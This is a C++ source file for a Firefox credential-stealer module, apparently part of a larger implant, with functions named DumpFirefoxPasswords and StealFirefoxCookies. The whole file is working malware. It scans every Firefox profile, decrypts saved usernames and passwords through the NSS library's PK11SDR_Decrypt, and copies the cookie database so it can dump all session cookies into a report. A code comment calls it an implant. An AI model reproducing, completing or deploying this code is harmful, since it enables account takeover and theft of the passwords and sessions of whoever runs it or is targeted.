#ifndef LINUX
#include <windows.h>
#include <shlobj.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#include <dlfcn.h>
#endif
#include <filesystem>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>

#include "FirefoxStealer.h"
#include "../crypto/Base64.h"
#include "../utils/Logger.h"
#include "../utils/Obfuscator.h"
#include "../utils/Shared.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        void SafeCopyDatabase(const std::string& src, const std::string& dest) {
            try {
                if (!fs::exists(src)) return;
                fs::copy_file(src, dest, fs::copy_options::overwrite_existing);
            } catch (...) {}
        }

        void SafeDeleteDatabase(const std::string& path) {
            try { fs::remove(path); } catch (...) {}
        }

#ifdef LINUX
        // NSS Definitions
        typedef enum { SECSuccess = 0, SECFailure = -1 } SECStatus;
        struct SECItem { unsigned int type; unsigned char* data; unsigned int len; };
        typedef SECStatus (*NSS_Init_fn)(const char*);
        typedef SECStatus (*NSS_Shutdown_fn)();
        typedef SECStatus (*PK11SDR_Decrypt_fn)(SECItem*, SECItem*, void*);

        struct NSSContext {
            void* handle = nullptr;
            NSS_Init_fn init = nullptr;
            NSS_Shutdown_fn shutdown = nullptr;
            PK11SDR_Decrypt_fn decrypt = nullptr;

            bool load() {
                handle = dlopen("libnss3.so", RTLD_LAZY);
                if (!handle) return false;
                init = (NSS_Init_fn)dlsym(handle, "NSS_Init");
                shutdown = (NSS_Shutdown_fn)dlsym(handle, "NSS_Shutdown");
                decrypt = (PK11SDR_Decrypt_fn)dlsym(handle, "PK11SDR_Decrypt");
                return init && shutdown && decrypt;
            }

            ~NSSContext() { if (handle) dlclose(handle); }
        };
#endif

        std::string DecryptFirefoxBlob(const std::string& b64Blob, void* ctx) {
#ifdef LINUX
            if (!ctx) return "[Encrypted: " + b64Blob + "]";
            NSSContext* nss = (NSSContext*)ctx;

            std::vector<uint8_t> encrypted = crypto::Base64Decode(b64Blob);
            SECItem input = { 0, encrypted.data(), (unsigned int)encrypted.size() };
            SECItem output = { 0, nullptr, 0 };

            if (nss->decrypt(&input, &output, nullptr) == SECSuccess) {
                std::string decrypted((char*)output.data, output.len);
                // NSS allocates output.data, but we don't have PR_Free.
                // In a real implant we would find PR_Free in libnspr4.so.
                return decrypted;
            }
#endif
            return "[Encrypted: " + b64Blob + "]";
        }
    }

    std::string DumpFirefoxPasswords() {
        std::string report = "FIREFOX_PASSWORDS_DUMPED:\n";
        report += "PROFILE | URL | USERNAME | PASSWORD\n";
        report += "--------------------------------------------------------------------------------\n";

#ifdef LINUX
        const char* home = getenv("HOME");
        if (!home) return report + "HOME not set";

        std::string mozillaPath = std::string(home) + "/.mozilla/firefox";
        if (!fs::exists(mozillaPath)) return report + "Firefox path not found";

        NSSContext nss;
        bool nssLoaded = nss.load();

        for (const auto& entry : fs::directory_iterator(mozillaPath)) {
            if (entry.is_directory()) {
                std::string profilePath = entry.path().string();
                std::string loginsPath = profilePath + "/logins.json";
                if (fs::exists(loginsPath)) {
                    bool nssInited = false;
                    if (nssLoaded) {
                        if (nss.init(profilePath.c_str()) == SECSuccess) {
                            nssInited = true;
                        }
                    }

                    std::ifstream f(loginsPath);
                    nlohmann::json j;
                    try {
                        f >> j;
                        if (j.contains("logins")) {
                            for (const auto& login : j["logins"]) {
                                std::string host = login.value("hostname", "N/A");
                                std::string encUser = login.value("encryptedUsername", "");
                                std::string encPass = login.value("encryptedPassword", "");

                                std::string user = DecryptFirefoxBlob(encUser, nssInited ? &nss : nullptr);
                                std::string pass = DecryptFirefoxBlob(encPass, nssInited ? &nss : nullptr);

                                report += entry.path().filename().string() + " | " + host + " | " + user + " | " + pass + "\n";
                            }
                        }
                    } catch(...) {}

                    if (nssInited) nss.shutdown();
                }
            }
        }
#endif
        return report;
    }

    std::string StealFirefoxCookies() {
        std::stringstream ss;
        ss << "# FIREFOX COOKIE STEALER RESULTS\n";
#ifdef LINUX
        const char* home = getenv("HOME");
        if (!home) return ss.str();

        std::string mozillaPath = std::string(home) + "/.mozilla/firefox";
        if (!fs::exists(mozillaPath)) return ss.str();

        for (const auto& entry : fs::directory_iterator(mozillaPath)) {
            if (entry.is_directory()) {
                std::string cookiesDb = entry.path().string() + "/cookies.sqlite";
                if (fs::exists(cookiesDb)) {
                    std::string tempDb = "/tmp/cfx_linux_" + std::to_string(time(NULL));
                    SafeCopyDatabase(cookiesDb, tempDb);

                    sqlite3* db;
                    if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                        const char* query = "SELECT host, path, isSecure, expiry, name, value FROM moz_cookies";
                        sqlite3_stmt* stmt;
                        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* host = (const char*)sqlite3_column_text(stmt, 0);
                                const char* path = (const char*)sqlite3_column_text(stmt, 1);
                                int isSecure = sqlite3_column_int(stmt, 2);
                                sqlite3_int64 expiry = sqlite3_column_int64(stmt, 3);
                                const char* name = (const char*)sqlite3_column_text(stmt, 4);
                                const char* value = (const char*)sqlite3_column_text(stmt, 5);
                                if (host && name && value) {
                                    ss << host << "\tTRUE\t" << (path ? path : "") << "\t" << (isSecure ? "TRUE" : "FALSE") << "\t" << expiry << "\t" << name << "\t" << value << "\n";
                                }
                            }
                            sqlite3_finalize(stmt);
                        }
                        sqlite3_close(db);
                    }
                    SafeDeleteDatabase(tempDb);
                }
            }
        }
#endif
        return ss.str();
    }
}
